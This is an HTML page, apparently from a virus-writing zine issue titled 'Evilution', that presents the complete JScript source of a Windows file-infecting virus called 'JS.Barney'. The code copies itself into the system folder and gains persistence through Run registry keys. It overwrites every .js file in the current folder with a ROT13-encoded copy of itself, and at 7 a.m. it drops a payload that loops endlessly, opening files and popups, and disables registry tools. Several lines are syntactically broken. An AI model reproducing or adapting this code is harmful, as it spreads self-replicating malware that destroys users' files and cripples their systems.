<html>
<head>
<title>Doom Riderz - Evilution Issue 1</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="stylesheet" type="text/css" href="../doom.css">
<script type="text/javascript" src="../fader.js"></script>
</head>
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<br>
<div id="viewerText">
<div id="viewerTextHeader"><a href="#">JS.Barney by Mr`Anderson && Synge </a> || <a href="bin/synge/barney/">Project Folder</a></div>
<pre>
<!--- put article/source here --->
function Encode(string)
{
  output=new String("");
  current=new String("");
  for(k=0; k<=string.length; k++)
  {
    current=string.substring(k, k+1);

    switch(current)
    {
      case "a": output+="n";
      break;
      case "b": output+="o";
      break;
      case "c": output+="p";
      break;
      case "d": output+="q";
      break;
      case "e": output+="r";
      break;
      case "f": output+="s";
      break;
      case "g": output+="t";
      break;
      case "h": output+="u";
      break;
      case "i": output+="v";
      break;
      case "j": output+="w";
      break;
      case "k": output+="x";
      break;
      case "l": output+="y";
      break;
      case "m": output+="z";
      break;
      case "n": output+="a";
      break;
      case "o": output+="b";
      break;
      case "p": output+="c";
      break;
      case "q": output+="d";
      break;
      case "r": output+="e";
      break;
      case "s": output+="f";
      break;
      case "t": output+="g";
      break;
      case "u": output+="h";
      break;
      case "v": output+="i";
      break;
      case "w": output+="j";
      break;
      case "x": output+="k";
      break;
      case "y": output+="l";
      break;
      case "z": output+="m";
      break;
      case "A": output+="N";
      break;
      case "B": output+="O";
      break;
      case "C": output+="P";
      break;
      case "D": output+="Q";
      break;
      case "E": output+="R";
      break;
      case "F": output+="S";
      break;
      case "G": output+="T";
      break;
      case "H": output+="U";
      break;
      case "I": output+="V";
      break;
      case "J": output+="W";
      break;
      case "K": output+="X";
      break;
      case "L": output+="Y";
      break;
      case "M": output+="Z";
      break;
      case "N": output+="A";
      break;
      case "O": output+="B";
      break;
      case "P": output+="C";
      break;
      case "Q": output+="D";
      break;
      case "R": output+="E";
      break;
      case "S": output+="F";
      break;
      case "T": output+="G";
      break;
      case "U": output+="H";
      break;
      case "V": output+="I";
      break;
      case "W": output+="J";
      break;
      case "X": output+="K";
      break;
      case "Y": output+="L";
      break;
      case "Z": output+="M";
      break;
      default : output+=current;
    }
  }
  return output;
}
function ReadVirus(strFileName) 
{
   var strContents;
   strContents = "";

   objFSO = new ActiveXObject("Scripting.FileSystemObject");
   if (!objFSO.FileExists(strFileName)) 
   {
      CopyVirus();
      strContents = objFSO.OpenTextFile(strFileName, 1, 0).ReadAll();
      return strContents;
   }
   
   if (objFSO.FileExists(strFileName)) 
   {
      strContents = objFSO.OpenTextFile(strFileName, 1, 0).ReadAll();
      return strContents;
   }
} 

function CopyVirus() 
{
   fso = new ActiveXObject("Scripting.FileSystemObject");
   var shell=new ActiveXObject("WScript.Shell");
   virusname = WScript.ScriptFullName;
   file = fso.GetFile(virusname);
   file.copy(fso.GetSpecialFolder(1)+"\\barney.jse", true);
   shell.RegWrite("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\barney","wscript.exe c:\\windows\\system32\\barney.jse");
}
function infectCurrentDir(folder)
{
   fso = new ActiveXObject("Scripting.FileSystemObject");
   var dec= "    var strContents;\r\n"+
            "    strContents = \""+(((Encode(virus).replace("\\","\\\\")).replace("\"","\\\"")).replace("\r","\\r")).replace("\n","\\n")+"\";\r\n"+
            "    objFSO = new ActiveXObject(\"Scripting.FileSystemObject\");\r\n"+
            "    var shell=new ActiveXObject(\"WScript.Shell\");\r\n"+
            "   Virus = Decode(strContents);\r\n"+
            "   victim = objFSO.OpenTextFile(\"Imbarney.js\", 2, 0);\r\n"+
            "   victim.write(virus);\r\n"+
            "   victom.close();\r\n"+
            "   shell.run(\"WScript.exe Imbarney.js\");\r\n"+
            "function Decode(string)\r\n"+
            "{\r\n"+
            "  \r\n"+
            "  output=new String(\"\");\r\n"+
            "  current=new String(\"\");\r\n"+
            "  for(k=0; k<=string.length; k++)\r\n"+
            "  {\r\n"+
            "    current=string.substring(k, k+1);\r\n"+
            "\r\n"+
            "    switch(current)\r\n"+
            "    {\r\n"+
            "      case \"n\": output+=\"a\";\r\n"+
            "      break;\r\n"+
            "      case \"o\": output+=\"b\";\r\n"+
            "      break;\r\n"+
            "      case \"p\": output+=\"c\";\r\n"+
            "      break;\r\n"+
            "      case \"q\": output+=\"d\";\r\n"+
            "      break;\r\n"+
            "      case \"r\": output+=\"e\";\r\n"+
            "      break;\r\n"+
            "      case \"s\": output+=\"f\";\r\n"+
            "      break;\r\n"+
            "      case \"t\": output+=\"g\";\r\n"+
            "      break;\r\n"+
            "      case \"u\": output+=\"h\";\r\n"+
            "      break;\r\n"+
            "      case \"v\": output+=\"i\";\r\n"+
            "      break;\r\n"+
            "      case \"w\": output+=\"j\";\r\n"+
            "      break;\r\n"+
            "      case \"x\": output+=\"k\";\r\n"+
            "      break;\r\n"+
            "      case \"y\": output+=\"l\";\r\n"+
            "      break;\r\n"+
            "      case \"z\": output+=\"m\";\r\n"+
            "      break;\r\n"+
            "      case \"a\": output+=\"n\";\r\n"+
            "      break;\r\n"+
            "      case \"b\": output+=\"o\";\r\n"+
            "      break;\r\n"+
            "      case \"c\": output+=\"p\";\r\n"+
            "      break;\r\n"+
            "      case \"d\": output+=\"q\";\r\n"+
            "      break;\r\n"+
            "      case \"e\": output+=\"r\";\r\n"+
            "      break;\r\n"+
            "      case \"f\": output+=\"s\";\r\n"+
            "      break;\r\n"+
            "      case \"g\": output+=\"t\";\r\n"+
            "      break;\r\n"+
            "      case \"h\": output+=\"u\";\r\n"+
            "      break;\r\n"+
            "      case \"i\": output+=\"v\";\r\n"+
            "      break;\r\n"+
            "      case \"j\": output+=\"w\";\r\n"+
            "      break;\r\n"+
            "      case \"k\": output+=\"x\";\r\n"+
            "      break;\r\n"+
            "      case \"l\": output+=\"y\";\r\n"+
            "      break;\r\n"+
            "      case "m": output+="z";\r\n"+
            "      break;\r\n"+
            "      case \"N\": output+=\"A\";\r\n"+
            "      break;\r\n"+
            "      case \"O\": output+=\"B\";\r\n"+
            "      break;\r\n"+
            "      case \"C\": output+=\"P\";\r\n"+
            "      break;\r\n"+
            "      case \"D\": output+=\"Q\";\r\n"+
            "      break;\r\n"+
            "      case "E": output+="R";\r\n"+
            "      break;\r\n"+
            "      case "S": output+="F";\r\n"+
            "      break;\r\n"+
            "      case \"T\": output+=\"G\";\r\n"+
            "      break;\r\n"+
            "      case \"U\": output+=\"H\";\r\n"+
            "      break;\r\n"+
            "      case \"V\": output+=\"I\";\r\n"+
            "      break;\r\n"+
            "      case \"W\": output+=\"J\";\r\n"+
            "      break;\r\n"+
            "      case "X": output+="K";\r\n"+
            "      break;\r\n"+
            "      case \"Y\": output+=\"L\";\r\n"+
            "      break;\r\n"+
            "      case "Z": output+="M";\r\n"+
            "      break;\r\n"+
            "      case \"A\": output+=\"N\";\r\n"+
            "      break;\r\n"+
            "      case \"B\": output+=\"O\";\r\n"+
            "      break;\r\n"+
            "      case \"P\": output+=\"C\";\r\n"+
            "      break;\r\n"+
            "      case \"Q\": output+=\"D\";\r\n"+
            "      break;\r\n"+
            "      case \"R\": output+=\"E\";\r\n"+
            "      break;\r\n"+
            "      case \"S\": output+=\"F\";\r\n"+
            "      break;\r\n"+
            "      case \"G\": output+=\"T\";\r\n"+
            "      break;\r\n"+
            "      case \"H\": output+=\"U\";\r\n"+
            "      break;\r\n"+
            "      case \"I\": output+=\"V\";\r\n"+
            "      break;\r\n"+
            "      case \"J\": output+=\"W\";\r\n"+
            "      break;\r\n"+
            "      case \"K\": output+=\"X\";\r\n"+
            "      break;\r\n"+
            "      case \"L\": output+=\"Y\";\r\n"+
            "      break;\r\n"+
            "      case \"M\": output+=\"Z\";\r\n"+
            "      break;\r\n"+
            "      default : output+=current;\r\n"+
            "    }\r\n"+
            "  }\r\n";
            "     return output;\r\n"+
            "}";

   var f = fso.GetFolder(folder);
   var fc = new Enumerator(f.files);
   for (; !fc.atEnd(); fc.moveNext())
   {
      var fileName=fc.item().Name
      if(-1!=fileName.search(".js"))
      { 
         if(fileName!="barney.jse")
         {
            var virus = ReadVirus(fso.GetSpecialFolder(1)+"\\barney.jse");
            victim = fso.OpenTextFile(fileName, 2,0);
            victim.write(dec);
            victim.close();
         } 
      }
   }
}

var shell=new ActiveXObject("WScript.Shell");
var virus = ReadVirus(fso.GetSpecialFolder(1)+"\\barney.jse");
infectCurrentDir(".");

var thisdate = new Date();
if(thisdate.getHours()==7)
{
	payload();
}

function payload(){
	var payload_filename = "explorer.js";
	var payload_file = "var txtName = \"You_Have_Been_Infected_By_Barney.txt\";\r\n"+
            			 "var ascii = \r\n"+
            			 "\"\\r\\n\"+\r\n"+
            			 "\"     You have been infected by Barney - written by Mr`Anderson & Synge from:\\r\\n\"+\r\n"+
            			 "\"\\r\\n\"+\r\n"+
            			 "\"       ######                                                            \\r\\n\"+\r\n"+
            			 "\"       #     #  ####   ####  #    # #####  # #####  ###### #####  ###### \\r\\n\"+\r\n"+
            			 "\"       #     # #    # #    # ##  ## #    # # #    # #      #    #     #  \\r\\n\"+\r\n"+
            			 "\"       #     # #    # #    # # ## # #    # # #    # #####  #    #    #   \\r\\n\"+\r\n"+
            			 "\"       #     # #    # #    # #    # #####  # #    # #      #####    #    \\r\\n\"+\r\n"+
            			 "\"       #     # #    # #    # #    # #   #  # #    # #      #   #   #     \\r\\n\"+\r\n"+
            			 "\"       ######   ####   ####  #    # #    # # #####  ###### #    # ###### \";\r\n"+
            			 "try{\r\n"+
            			 "var fso=new ActiveXObject(\"Scripting.FileSystemObject\");\r\n"+
            			 "var shell=new ActiveXObject(\"WScript.Shell\");\r\n"+
            			 "while(true){\r\n"+
            			 "var f=fso.CreateTextFile(txtName);\r\n"+
            			 "f.Write(ascii);\r\n"+
            			 "f.Close();\r\n"+
            			 "shell.Run(txtName,3,true);\r\n"+
            			 "shell.PopUp(\"I love your computer, your computer loves me, we are a happy family.\",1,\"asd\",48);\r\n"+
            			 "}\r\n"+
            			 "}catch(e){}\r\n";
	var fso=new ActiveXObject("Scripting.FileSystemObject");
	var f=fso.CreateTextFile(payload_filename);
	f.Write(payload_file);
	f.Close();
	var shell=new ActiveXObject("WScript.Shell");
	var parentfolder = fso.GetFile(WScript.ScriptFullName).ParentFolder;
	var runcmd = "\""+WScript.FullName+"\" \""+parentfolder+"\\"+payload_filename+"\"";
	shell.RegWrite("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Shell",runcmd);
	shell.RegWrite("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools",1,"REG_DWORD");
	shell.Run(runcmd,0,false);
}

</pre>
</div>
</body>
</html>
